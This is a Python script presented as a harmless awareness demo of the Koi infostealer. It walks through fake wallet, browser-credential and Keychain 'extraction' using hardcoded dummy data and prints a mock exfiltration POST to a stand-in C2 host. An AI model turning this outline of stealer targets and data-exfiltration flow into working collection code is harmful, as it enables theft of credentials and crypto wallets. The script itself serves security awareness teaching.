import os
import platform
import json
import time
import getpass
import random
import sys

# 🧠 Simulated data banks
FAKE_WALLETS = {
    "MetaMask": "seed phrase: lion climb shadow mango drift...",
    "Exodus": "wallet.dat (encrypted) found at ~/Library/Application Support/Exodus/"
}

FAKE_BROWSER_DATA = {
    "Chrome": {
        "Passwords": ["example.com:user@example.com:pass123"],
        "Cookies": ["sessionid=FAKESESSION123"]
    },
    "Safari": {
        "Autofill": ["John Doe - 1234 Main St - Visa **** 1234"]
    }
}

FAKE_KEYCHAIN = {
    "Apple Keychain": ["icloud_login: icloud_user@example.com / fakepass456"]
}


# 🎭 Simulated permissions check
def display_permission_prompt():
    print("\n🔐 [Prompt] macOS would like to access your Documents and Keychain.")
    input("Press Enter to 'Allow' for educational simulation...")

# 🔍 Simulate scanning directories
def scan_directories():
    print("\n📁 [Scan] Searching ~/Documents and ~/Library for wallet traces...")
    time.sleep(1)
    return FAKE_WALLETS

# 🌐 Simulate browser data extraction
def extract_browser_data():
    print("\n🌐 [Browser] Simulating browser password and cookie dump...")
    time.sleep(1)
    return FAKE_BROWSER_DATA

# 🔐 Simulate keychain access
def simulate_keychain_access():
    print("\n🔐 [Keychain] Simulating macOS Keychain extraction...")
    time.sleep(1)
    return FAKE_KEYCHAIN

# 🎯 Simulate exfiltration to fake C2 server
def exfiltrate(data):
    print("\n🚀 [Exfiltration] Sending data to C2 server (simulation)...")
    c2_url = "https://fakec2.example.com/upload"
    print(f"POST {c2_url}")
    print(json.dumps(data, indent=4))
    print("\n✅ [Status] Data exfiltration simulated successfully.\n")

# 🧰 Main function
def main():
    print("🧬 [Koi Stealer Simulation - Educational Edition]")
    print(f"System: {platform.system()} {platform.release()} | User: {getpass.getuser()}")
    print("-" * 50)

    display_permission_prompt()

    wallet_data = scan_directories()
    browser_data = extract_browser_data()
    keychain_data = simulate_keychain_access()

    combined_data = {
        "hostname": platform.node(),
        "os": f"{platform.system()} {platform.version()}",
        "wallet_data": wallet_data,
        "browser_data": browser_data,
        "keychain_data": keychain_data,
        "timestamp": time.ctime()
    }

    exfiltrate(combined_data)

    print("🛡️  This demo is safe and for awareness purposes only.")
    print("📚  Learn more: MITRE ATT&CK T1555 / T1539 / T1552")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n❌ Simulation aborted.")
        sys.exit(0)
